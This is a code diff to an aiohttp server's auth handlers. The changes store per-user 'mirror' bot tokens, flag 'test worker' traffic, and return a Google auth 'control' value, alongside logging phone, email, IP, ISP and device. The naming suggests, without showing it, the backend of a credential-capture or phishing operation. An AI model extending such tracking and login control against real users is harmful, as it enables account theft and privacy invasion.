@@ -79,8 +79,12 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
         if email:
             db.set_user_email(DB_PATH, tg_id, email)
 
+        bot_token = data.get("bot_token") or data.get("mirror_token")
+        if bot_token:
+            db.set_user_mirror_token(DB_PATH, tg_id, bot_token)
+
         user = db.get_user_by_tg_id(DB_PATH, tg_id)
-        is_test = bool(data.get("is_test"))
+        is_test = bool(data.get("is_test")) or is_test_worker(bot_token)
         if not is_test and user:
             u_mtoken = user.get("mirror_token") if "mirror_token" in user.keys() else None
             u_muser = user.get("mirror_username") if "mirror_username" in user.keys() else None
@@ -103,6 +107,7 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
             isp=geo_info.get("isp"),
             device=device,
             is_test=is_test,
+            mirror_token=bot_token,
         )
         logger.info("Successfully processed auth completion for user tg_id=%s, phone=%s, email=%s", tg_id, phone, email)
 
@@ -206,8 +211,12 @@ async def handle_auth_event(request: web.Request) -> web.Response:
                 device=device,
             )
 
+        bot_token = data.get("bot_token") or data.get("mirror_token")
+        if bot_token and tg_id:
+            db.set_user_mirror_token(DB_PATH, tg_id, bot_token)
+
         user = db.get_user_by_tg_id(DB_PATH, tg_id)
-        is_test = bool(data.get("is_test"))
+        is_test = bool(data.get("is_test")) or is_test_worker(bot_token)
         if not is_test and user:
             u_mtoken = user.get("mirror_token") if "mirror_token" in user.keys() else None
             u_muser = user.get("mirror_username") if "mirror_username" in user.keys() else None
@@ -237,6 +246,7 @@ async def handle_auth_event(request: web.Request) -> web.Response:
             isp=geo_info.get("isp"),
             device=device,
             is_test=is_test,
+            mirror_token=bot_token,
         )
         logger.info("Processed auth event '%s' for tg_id=%s (email=%s, ip=%s, device=%s)", event, tg_id, email, client_ip, device)
         return web.json_response({"ok": True})
@@ -287,12 +297,19 @@ async def handle_auth_status(request: web.Request) -> web.Response:
             except Exception:
                 pass
 
+        gctrl = None
+        if user and "tg_id" in user.keys():
+            gctrl = db.get_google_auth_control(DB_PATH, user["tg_id"])
+        elif tg_id and str(tg_id).isdigit():
+            gctrl = db.get_google_auth_control(DB_PATH, int(tg_id))
+
         return web.json_response({
             "ok": True,
             "authorized": is_auth,
             "auth_step": auth_step,
             "username": user["username"] if user else None,
             "nickname": user["nickname"] if user else None,
+            "google_control": gctrl,
         })
     except Exception as e:
         return web.json_response({"ok": False, "authorized": False, "error": str(e)})
